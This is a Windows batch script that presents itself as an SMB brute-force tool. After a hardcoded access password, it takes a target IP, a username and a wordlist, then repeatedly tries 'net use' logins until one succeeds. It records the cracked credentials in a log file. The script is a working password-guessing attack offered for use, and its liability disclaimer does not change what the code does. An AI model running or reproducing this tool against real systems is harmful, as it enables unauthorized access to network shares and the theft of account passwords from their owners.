@echo off

REM start /b powershell -command "&{$w=(get-host).ui.rawui;$w.buffersize=@{width=350;height=999};$w.windowsize=@{width=350;height=55};}"

echo.
COLOR 4
set /p pass="PLEASE ENTER THE PASSWORD GIVEN TO YOU PRIVATELY BY THE AUTHOR >> "

if not "%pass%"=="AZGFRT" (
  cls
  echo WRONG PASSWORD!
  timeout /t 1 >nul
  goto :eof
)

:menu
title SMB Bruteforce
COLOR A
cls
echo.
echo Welcome to Bruteforce!
echo.
echo If you don't know what a bruteforce attack is, it's essentially a tool that tries a list of passwords provided in a list to try to crack the password of the device with the IP address.
echo.
echo If you need a tutorial on how to use this, we recommend you close this window and read the short text file included in this folder.
echo.
echo PRESS ANY KEY TO CONTINUE
pause >nul
cls
COLOR 4
echo.
echo WARNING: Use of this tool for unauthorized access to systems is illegal and unethical. 
echo The creator of this script is not liable for any legal consequences you may face as a result of its use. 
echo Always obtain proper authorization before attempting to access any system.
echo.
echo You can use different password lists, the one included in this folder is only an example.
echo.
echo PRESS ANY KEY TO CONTINUE
pause >nul
cls
COLOR A
echo.
set /p ip="ENTER IP ADDRESS >> "
cls
echo.
set /p user="ENTER USERNAME >> "
cls
echo.
set /p wordlist="ENTER PASSWORD LIST (MUST BE .TXT) >> "
cls
COLOR 4
echo.
set /p confirm="ARE YOU SURE YOU WANT TO BRUTE FORCE? Y FOR YES AND N FOR NO >> "

if /i "%confirm%"=="N" (
    echo.
    COLOR A
    echo CANCELLING..
    timeout /t 2 >nul
    goto menu
)

cls

echo.
echo Bruteforce starting...
timeout /t 2 >nul
echo Gathering password list values...
timeout /t 3 >nul

set /a count=1
set logfile=".\logs\bruteforce_log.txt"

if not exist %logfile% (
    echo IP Address, Username, Password, Attempt Number > %logfile%
)

for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
  timeout /t 10 >nul
)
COLOR 4
echo Password not found :(
echo PRESS ANY KEY TO RESTART PROGRAM
pause >nul
goto menu

:success
echo.
COLOR A
echo Password found at attempt %count%! %pass%
echo IP Address: %ip%, Username: %user%, Password: %pass% >> %logfile%
net use \\%ip% /d /y >nul 2>&1
echo PRESS ANY KEY TO RESTART PROGRAM
pause >nul
goto menu

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
COLOR 6
echo [ATTEMPT NUMBER %count%]: [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
